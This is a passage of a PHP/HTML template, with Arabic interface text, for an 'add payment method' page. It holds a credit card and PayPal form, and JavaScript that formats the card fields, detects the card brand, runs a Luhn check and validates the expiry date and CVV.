                    </div>
                    <?php endforeach; ?>
                </div>
                <?php endif; ?>

                <button id="add-payment-btn" class="inline-flex items-center px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition-colors">
                    <i class="fas fa-plus ml-2"></i>
                    <?php echo isset($lang['add_payment_method']) ? $lang['add_payment_method'] : translate_static_text('إضافة طريقة دفع', $selected_lang); ?>
                </button>
            </div>

            <!-- نموذج إضافة طريقة دفع -->
            <div id="payment-form" class="bg-white rounded-lg shadow-md p-6 hidden">
                <h2 class="text-xl font-semibold text-purple-800 mb-6"><?php echo isset($lang['add_payment_method']) ? $lang['add_payment_method'] : translate_static_text('إضافة طريقة دفع', $selected_lang); ?></h2>

                <form method="post" class="space-y-6">
                    <div class="mb-4">
                        <label class="block text-gray-700 mb-2"><?php echo $lang['payment_type'] ?? 'نوع طريقة الدفع'; ?></label>
                        <div class="flex space-x-4">
                            <label class="inline-flex items-center">
                                <input type="radio" name="type" value="credit_card" class="form-radio text-purple-600" checked>
                                <span class="mr-2"><?php echo $lang['credit_card'] ?? 'بطاقة ائتمان'; ?></span>
                                <div class="flex items-center space-x-1 mr-2">
                                    <i class="fab fa-cc-visa text-blue-600 text-xl"></i>
                                    <i class="fab fa-cc-mastercard text-red-600 text-xl"></i>
                                </div>
                            </label>
                            <label class="inline-flex items-center">
                                <input type="radio" name="type" value="paypal" class="form-radio text-purple-600">
                                <span class="mr-2">PayPal</span>
                                <div class="flex items-center mr-2">
                                    <i class="fab fa-paypal text-blue-800 text-xl"></i>
                                </div>
                            </label>
                        </div>
                    </div>

                    <div id="credit-card-fields">
                        <div class="mb-4">
                            <label for="card_number" class="block text-gray-700 mb-2"><?php echo $lang['card_number'] ?? 'رقم البطاقة'; ?></label>
                            <input type="text" id="card_number" name="card_number" class="w-full p-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent" placeholder="XXXX XXXX XXXX XXXX">
                            <div id="card-brand-icon" class="mt-2 text-xl">
                                <i class="fab fa-cc-visa text-blue-600 hidden" id="visa-icon"></i>
                                <i class="fab fa-cc-mastercard text-red-600 hidden" id="mastercard-icon"></i>
                                <i class="fab fa-cc-amex text-blue-800 hidden" id="amex-icon"></i>
                                <i class="fab fa-cc-discover text-orange-600 hidden" id="discover-icon"></i>
                                <span class="text-gray-500 text-sm" id="card-type-text"></span>
                            </div>
                        </div>

                        <div class="mb-4">
                            <label for="card_holder" class="block text-gray-700 mb-2"><?php echo $lang['card_holder'] ?? 'حامل البطاقة'; ?></label>
                            <input type="text" id="card_holder" name="card_holder" class="w-full p-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent">
                        </div>

                        <div class="grid grid-cols-2 gap-4">
                            <div class="mb-4">
                                <label for="expiry_date" class="block text-gray-700 mb-2"><?php echo $lang['expiry_date'] ?? 'تاريخ الانتهاء'; ?></label>
                                <input type="text" id="expiry_date" name="expiry_date" class="w-full p-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent" placeholder="MM/YY">
                            </div>

                            <div class="mb-4">
                                <label for="cvv" class="block text-gray-700 mb-2"><?php echo $lang['cvv'] ?? 'رمز الأمان (CVV)'; ?></label>
                                <input type="text" id="cvv" name="cvv" class="w-full p-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent" placeholder="123" maxlength="4">
                                <p class="text-xs text-gray-500 mt-1"><?php echo $lang['cvv_hint'] ?? '3 أرقام خلف البطاقة (4 أرقام لـ Amex)'; ?></p>
                            </div>
                        </div>
                    </div>

                    <div id="paypal-fields" class="hidden">
                        <div class="mb-4 text-center">
                            <p class="text-gray-700 mb-4"><?php echo $lang['paypal_redirect_message'] ?? 'سيتم توجيهك إلى صفحة تسجيل الدخول إلى PayPal عند النقر على زر الحفظ'; ?></p>
                            <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" alt="PayPal Logo" class="mx-auto" style="width: 120px;">
                        </div>
                    </div>

                    <div class="mb-4">
                        <label class="inline-flex items-center">
                            <input type="checkbox" name="is_default" class="form-checkbox text-purple-600">
                            <span class="mr-2"><?php echo $lang['set_as_default'] ?? 'تعيين كطريقة دفع افتراضية'; ?></span>
                        </label>
                    </div>

                    <div class="flex justify-end space-x-3">
                        <button type="button" id="cancel-btn" class="px-4 py-2 border border-gray-300 rounded-lg text-gray-700 hover:bg-gray-50 transition-colors">
                            <?php echo $lang['cancel'] ?? 'إلغاء'; ?>
                        </button>
                        <button type="submit" name="add_payment_method" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition-colors">
                            <?php echo $lang['save'] ?? 'حفظ'; ?>
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const addPaymentBtn = document.getElementById('add-payment-btn');
    const paymentForm = document.getElementById('payment-form');
    const cancelBtn = document.getElementById('cancel-btn');
    const paymentTypeRadios = document.querySelectorAll('input[name="type"]');
    const creditCardFields = document.getElementById('credit-card-fields');
    const cardNumberInput = document.getElementById('card_number');
    const cardBrandIcon = document.getElementById('card-brand-icon');
    const visaIcon = document.getElementById('visa-icon');
    const mastercardIcon = document.getElementById('mastercard-icon');
    const amexIcon = document.getElementById('amex-icon');
    const discoverIcon = document.getElementById('discover-icon');
    const cardTypeText = document.getElementById('card-type-text');
    const expiryDateInput = document.getElementById('expiry_date');
    const cvvInput = document.getElementById('cvv');

    // إظهار/إخفاء نموذج إضافة طريقة دفع
    addPaymentBtn.addEventListener('click', function() {
        paymentForm.classList.remove('hidden');
        addPaymentBtn.classList.add('hidden');
    });

    cancelBtn.addEventListener('click', function() {
        paymentForm.classList.add('hidden');
        addPaymentBtn.classList.remove('hidden');
        // إعادة تعيين النموذج
        document.querySelector('form').reset();
        hideAllCardIcons();

        // إزالة مربع الخطأ إن وجد
        const errorBox = document.getElementById('form-error-box');
        if (errorBox) {
            errorBox.remove();
        }
    });

    // التحقق من صحة النموذج قبل الإرسال
    document.querySelector('form').addEventListener('submit', function(e) {
        // إزالة مربع الخطأ السابق إن وجد
        const oldErrorBox = document.getElementById('form-error-box');
        if (oldErrorBox) {
            oldErrorBox.remove();
        }

        // التحقق من نوع طريقة الدفع
        const paymentType = document.querySelector('input[name="type"]:checked').value;

        if (paymentType === 'credit_card') {
            let isValid = true;
            let errorMessage = '';

            // التحقق من رقم البطاقة
            const cardNumber = cardNumberInput.value.replace(/\s/g, '');
            if (cardNumber.length !== 16) {
                isValid = false;
                errorMessage = 'رقم البطاقة يجب أن يكون 16 رقم';
                cardNumberInput.classList.add('border-red-500');
            } else if (!validateCardLuhn(cardNumber)) {
                isValid = false;
                errorMessage = 'رقم البطاقة غير صحيح، يرجى التحقق من الرقم المدخل';
                cardNumberInput.classList.add('border-red-500');
            }

            // التحقق من اسم حامل البطاقة
            const cardHolder = document.getElementById('card_holder').value.trim();
            if (cardHolder === '') {
                isValid = false;
                errorMessage = 'يرجى إدخال اسم حامل البطاقة';
                document.getElementById('card_holder').classList.add('border-red-500');
            }

            // التحقق من تاريخ الانتهاء
            const expiryDate = expiryDateInput.value;
            if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
                isValid = false;
                errorMessage = 'يرجى إدخال تاريخ انتهاء صحيح بصيغة MM/YY';
                expiryDateInput.classList.add('border-red-500');
            } else {
                const [month, year] = expiryDate.split('/');
                const currentDate = new Date();
                const currentYear = currentDate.getFullYear() % 100; // آخر رقمين من السنة
                const currentMonth = currentDate.getMonth() + 1; // الشهر الحالي (1-12)

                if (parseInt(month) < 1 || parseInt(month) > 12 ||
                    (parseInt(year) < currentYear || (parseInt(year) === currentYear && parseInt(month) < currentMonth))) {
                    isValid = false;
                    errorMessage = 'تاريخ انتهاء البطاقة غير صحيح أو منتهي الصلاحية';
                    expiryDateInput.classList.add('border-red-500');
                }
            }

            // التحقق من رمز CVV
            const cvv = cvvInput.value;
            if (!/^\d{3,4}$/.test(cvv)) {
                isValid = false;
                errorMessage = 'يرجى إدخال رمز CVV صحيح (3 أو 4 أرقام)';
                cvvInput.classList.add('border-red-500');
            }

            if (!isValid) {
                e.preventDefault();

                // إنشاء مربع الخطأ
                const errorBox = document.createElement('div');
                errorBox.id = 'form-error-box';
                errorBox.className = 'bg-red-100 border-r-4 border-red-500 text-red-700 p-4 mb-6 rounded';
                errorBox.setAttribute('role', 'alert');
                errorBox.innerHTML = `<p>${errorMessage}</p>`;

                // إضافة مربع الخطأ في بداية النموذج
                this.insertBefore(errorBox, this.firstChild);

                // التمرير إلى مربع الخطأ
                errorBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }
        } else if (paymentType === 'paypal') {
            // إعادة التوجيه إلى صفحة تسجيل دخول PayPal
            e.preventDefault();
            window.location.href = 'paypal-login.php?return_url=' + encodeURIComponent('payment-methods.php');
        }
    });

    // إظهار/إخفاء حقول بطاقة الائتمان وحقول PayPal حسب نوع طريقة الدفع
    const paypalFields = document.getElementById('paypal-fields');

    paymentTypeRadios.forEach(function(radio) {
        radio.addEventListener('change', function() {
            if(this.value === 'credit_card') {
                creditCardFields.classList.remove('hidden');
                paypalFields.classList.add('hidden');
            } else if(this.value === 'paypal') {
                creditCardFields.classList.add('hidden');
                paypalFields.classList.remove('hidden');
            }
        });
    });

    // التحقق من نوع البطاقة وإظهار الأيقونة المناسبة
    cardNumberInput.addEventListener('input', function() {
        let cardNumber = this.value.replace(/\s+/g, '');

        // تقييد الطول إلى 16 رقم
        if (cardNumber.length > 16) {
            cardNumber = cardNumber.substring(0, 16);
        }

        // تنسيق رقم البطاقة (إضافة مسافات كل 4 أرقام)
        if (cardNumber.length > 0) {
            this.value = cardNumber.match(/.{1,4}/g).join(' ');
        }

        // إخفاء جميع الأيقونات
        hideAllCardIcons();

        // التحقق من نوع البطاقة
        if (/^4/.test(cardNumber)) {
            // فيزا
            showCardIcon(visaIcon);
            cardTypeText.textContent = 'Visa';
        } else if (/^5[1-5]/.test(cardNumber)) {
            // ماستركارد
            showCardIcon(mastercardIcon);
            cardTypeText.textContent = 'Mastercard';
        } else if (/^3[47]/.test(cardNumber)) {
            // أمريكان إكسبريس
            showCardIcon(amexIcon);
            cardTypeText.textContent = 'American Express';
            // تغيير نص تلميح CVV لبطاقات Amex
            document.querySelector('#cvv + p').textContent = '4 أرقام على وجه البطاقة';
        } else if (/^(6011|65)/.test(cardNumber)) {
            // ديسكفر
            showCardIcon(discoverIcon);
            cardTypeText.textContent = 'Discover';
        } else {
            cardTypeText.textContent = '';
        }
    });

    // تنسيق تاريخ الانتهاء (MM/YY)
    expiryDateInput.addEventListener('input', function() {
        const expiry = this.value.replace(/\D/g, '');

        if (expiry.length > 0) {
            if (expiry.length <= 2) {
                this.value = expiry;
            } else {
                this.value = expiry.slice(0, 2) + '/' + expiry.slice(2, 4);
            }
        }
    });

    // التحقق من CVV (3 أو 4 أرقام فقط)
    cvvInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
    });

    // دالة لإظهار أيقونة البطاقة
    function showCardIcon(icon) {
        cardBrandIcon.classList.remove('hidden');
        icon.classList.remove('hidden');
    }

    // دالة لإخفاء جميع أيقونات البطاقات
    function hideAllCardIcons() {
        visaIcon.classList.add('hidden');
        mastercardIcon.classList.add('hidden');
        amexIcon.classList.add('hidden');
        discoverIcon.classList.add('hidden');
        cardTypeText.textContent = '';
        // إعادة تعيين نص تلميح CVV
        document.querySelector('#cvv + p').textContent = '3 أرقام خلف البطاقة (4 أرقام لـ Amex)';
    }

    // التحقق من صحة رقم البطاقة باستخدام خوارزمية Luhn
    function validateCardLuhn(number) {
        // إزالة المسافات والشرطات
        number = number.replace(/\D/g, '');

        // التحقق من أن الطول 16 رقم
        if (number.length !== 16) {
            return false;
        }

        // تطبيق خوارزمية Luhn
        let sum = 0;
        let alt = false;
        for (let i = number.length - 1; i >= 0; i--) {
            let n = parseInt(number[i]);
            if (alt) {
                n *= 2;
                if (n > 9) {
                    n -= 9;
                }
            }
            sum += n;
            alt = !alt;
        }

        // التحقق من أن المجموع قابل للقسمة على 10
        return (sum % 10 === 0);
    }
});

// دالة لإخفاء أرقام البطاقة
function maskCardNumber(cardNumber) {
    if(!cardNumber) return '';

    // إزالة المسافات من رقم البطاقة
    cardNumber = cardNumber.replace(/\s+/g, '');

    // التأكد من أن رقم البطاقة يحتوي على 4 أرقام على الأقل
    if(cardNumber.length < 4) return 'XXXX';

    return 'XXXX XXXX XXXX ' + cardNumber.slice(-4);
}
</script>

<?php
require_once 'includes/footer.php';
?>
